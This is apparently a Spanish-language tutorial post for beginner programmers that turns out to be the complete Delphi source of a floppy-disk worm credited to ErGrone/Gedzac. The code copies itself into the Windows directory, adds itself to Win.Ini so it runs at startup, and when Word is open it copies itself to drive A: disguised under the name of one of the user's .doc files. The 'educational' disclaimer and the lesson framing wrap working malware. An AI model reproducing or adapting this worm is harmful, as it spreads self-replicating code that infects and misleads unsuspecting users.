Este código esta destinado a las personas que se inician en la programación, analizandolo aprendera a:

Hacer un Timer.

Detectar una clase determinada.

Escribir un archivo de texto sin perder la información ya almacenada.

Copiar Archivos.

Obtener el Directorio de Windows.

Buscar un archivo en un directorio.

Obtener nuestra linia de Comando.

--------------------------------------------------------------------------

program Disketes;

{Disketes.Dpr
Un Gusano de disketes
Muy basico
entra en proceso de buscar un disquete cuando detecta que una clase
de Word97/2000 esta activa.
Autor: ErGrone/Gedzac
Solo para fines educativos}
uses
SysUtils,
Windows;
function Directorio : String; //obtenemos el directorio de Windows
var
DirectorioWindows : PChar;
WTama : DWORD;
begin
WTama := MAX_PATH + 1;
GetMem( DirectorioWindows, WTama );
try
if Windows.GetWindowsDirectory( DirectorioWindows, WTama ) <> 0 then
Result := DirectorioWindows;
finally
FreeMem( DirectorioWindows );
end;
end;
function victimasF(pordonde:string):string;
//segunda fase
//Buscamos un DOC del cual tomar un nombre
var
archivos: TSearchRec;
vueltas : Integer;
Archivodoc:string;
begin
vueltas := FindFirst(pordonde+'*.Doc', FaAnyfile, archivos);
while vueltas = 0 do begin
if ((archivos.Attr and FaDirectory <> FaDirectory) and
(archivos.Attr and FaVolumeId <> FaVolumeID)) then
if archivos.Name <> '' then
begin
archivodoc:=archivos.Name;
inc(vueltas);
result := archivodoc;

if result='' then result:='Gedzac.Doc'; //si no encontramos archivos DOC nos vamos como Gedzac.Doc
end;
end;
end;
{$R disketes.RES}
//Primera Fase
var
Disclaimer:string;
ElINI:textFile;
ELTImERmsg:Tmsg;
MiNombre,Limpio:string;
texto: array[0..1000] of string ;
Longitud,a,b,Contador:integer;
begin
MiNombre := getcommandlinea; //obtenemos nuestro actual nombre (linia de comando)
Longitud := strlen(pchar(MiNombre));
for a := 2 to Longitud-2 do
begin
limpio := limpio+minombre[a];
end;
copyfile(pchar(limpio),pchar(directorio+'\VGA32.exe'),true); //nos copiamos al directorio de windows
Contador:=0;
AssignFile (elini,directorio+'\Win.Ini'); //nos registraremos en WinIni
Reset (elini);
While Eof(Elini) = False Do
Begin
Readln(elini,texto[contador]);
inc(contador);
end;
CloseFile (elini);
AssignFile (ElIni,directorio+'\Win.Ini'); 
rewrite (ElIni);
writeln(ElIni,'[Windows]');
writeln(ElIni,'load='+directorio+'\VGA32.exe');
for b := 0 to 1000 do
begin
if b > 1 then
if texto[b] <> '' then writeln(ElIni, texto[b]); 

end;
closefile(elini);

SetTimer(0, 0, 20000, nil); // este es el Timer, Cada dos minutos buscamos la clase
while (GetMessage(ElTimerMsg, 0, 0, 0)) do
begin
if FindWindow(Pchar('OpusAPP'),nil) > 0 then // Buscamos una classe de Word97/2000
//si la clase existe intentamos copiarnos a un posible disquete en la unidad A:
begin
Disclaimer:='Este es un gusano Basico de disketes, fue creado solo con fines educativos, por ErGrone/Gedzac';
copyfile(pchar(limpio),pchar('a:\'+VictimasF('c:\misdoc~1\')+'.exe'),true);
end;
end;
end.

Compilar con Delphi2 o superiores.
